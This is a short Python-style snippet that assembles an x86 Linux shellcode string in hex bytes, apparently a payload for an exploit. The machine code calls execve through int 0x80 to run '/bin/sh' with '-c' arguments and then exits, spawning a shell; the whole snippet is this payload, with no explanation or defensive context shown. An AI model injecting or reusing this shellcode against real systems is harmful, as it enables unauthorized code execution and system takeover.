shellcode = ""
shellcode += "\xEB\x2C\x5E\x6A\x00\x89\xF0\xEB\x01\x40\x80\x38\x00\x74\x09\x50"
shellcode += "\x80\x38\x00\x74\xF4\x40\xEB\xF8\x31\xC0\x50\x89\xE2\x8D\x4C\x24"
shellcode += "\x04\x8B\x19\xB0\x0B\xCD\x80\x31\xDB\x31\xC0\x40\xCD\x80\xE8\xCF"
shellcode += "\xFF\xFF\xFF"
shellcode += "sh\x00"
shellcode += "-c\x00"
shellcode += "/bin/sh\x00\x00"
